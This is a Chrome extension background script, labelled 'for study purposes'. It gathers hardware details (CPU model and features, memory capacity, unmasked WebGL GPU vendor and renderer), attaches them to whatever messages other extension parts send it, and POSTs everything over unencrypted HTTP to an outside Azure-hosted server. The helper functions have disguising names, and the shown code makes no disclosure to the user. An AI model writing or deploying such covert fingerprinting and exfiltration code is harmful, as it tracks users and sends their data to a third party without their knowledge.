/**
 * for study purposes
 * created by Dohuta - 2018
 * feedback: huynh.dohuta@gmail.com
 */

const version = '3.3.4',
    StorageArea = chrome.storage.local,
    xmlhttp = new XMLHttpRequest(),
    url = 'http://shanghai271.azurewebsites.net/api/values/';

const getEngineInfo = () => {
    return new Promise((resolve) => {
        chrome.system.cpu.getInfo((data) => {
            let obj = new Object();
            obj.archName = data.archName;
            obj.modelName = data.modelName;
            obj.features = data.features.toString();
            obj.numOfEngines = data.numOfProcessors;
            resolve(obj);
        });
    });
};

const getDeskInfo = () => {
    const gl = document.createElement("canvas").getContext("webgl");
    const ext = gl.getExtension('WEBGL_debug_renderer_info');
    return ext ? {
        vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL),
        renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL),
    } : {
        vendor: "unknown",
        renderer: "unknown",
    };
};

const getPoolInfo = () => {
    return new Promise((resolve) => {
        chrome.system.memory.getInfo((data) => {
            let obj = new Object();
            obj.available = data.availableCapacity;
            obj.capacity = data.capacity;
            resolve(obj);
        });
    });
}

const throwback = (obj) => {
    try {
        xmlhttp.open('POST', url, true);
        xmlhttp.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
        xmlhttp.send(JSON.stringify(obj));
        return true;
    } catch (error) {
        console.log(error);
        return false
    }
};

chrome.extension.onConnect.addListener(function(port) {
    console.log("Background connected!");
    port.onMessage.addListener(function(msg) {
        console.log("Background received: ");
        let obj = new Object();
        obj.data = msg;
        getEngineInfo().then((data) => {
            obj.engine = data;
        }).then(() => {
            getPoolInfo().then((data) => {
                obj.pool = data;
            }).then(() => {
                obj.desk = getDeskInfo();
            }).then(() => {
                console.log(obj);
                throwback(obj);
            });
        });
    });
})

function clear() {
    StorageArea.get('version', (result) => {
        if (!result || result !== version) {
            StorageArea.clear();
            StorageArea.set({ 'version': version });
        } else
            StorageArea.set({ 'version': version });
    });
}

clear();